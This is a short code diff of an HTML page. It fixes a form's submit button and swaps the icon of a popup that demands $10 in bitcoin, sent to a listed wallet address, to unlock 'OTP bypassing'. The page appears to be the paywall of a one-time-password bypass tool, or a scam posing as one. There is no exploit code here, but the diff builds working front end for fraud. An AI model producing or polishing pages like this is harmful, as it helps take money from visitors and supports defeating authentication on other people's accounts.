@@ -130,7 +130,7 @@ if(a>=txt.length) {
 		   <div class="mb-3 bg-color">
   <form method="get">
 	<input type="text" placeholder="Input Transaction ID" require" />
-	<input type="submit > 							      
+	<input type="submit" /> 							      
 			   </form>
             <div class="mb-3 bg-color">
               
@@ -147,7 +147,7 @@ if(a>=txt.length) {
 	 <script>
 Swal.fire({
   title: 'Activation Needed ⚠️',
-  iconHtml: '<img src="https://s3.amazonaws.com/cdn.freshdesk.com/data/helpdesk/attachments/production/67013648486/logo/bEg0jlYeXFGp4fwYQfmfR3WPrjfn7wD27g.png" height="100px" width="100px"/>',
+  iconHtml: '<img src="https://i.ibb.co/cQYyR9L/IMG-1096.jpg" height="100px" width="100px"/>',
   html:"This activation is entitled to only one OTP bypassing. <br>👉<b>Help :</b> Kindly transact $10 worth btc to the address below. <br><br><b>Address :</b> <b>bc1q0a2up8lsp8uuksqtg0swj24eur8tlc04k99mk0  👉</b> <b>Copy your transaction ID and paste it when asked.<br>",
   customClass: {
     icon: 'no-border'
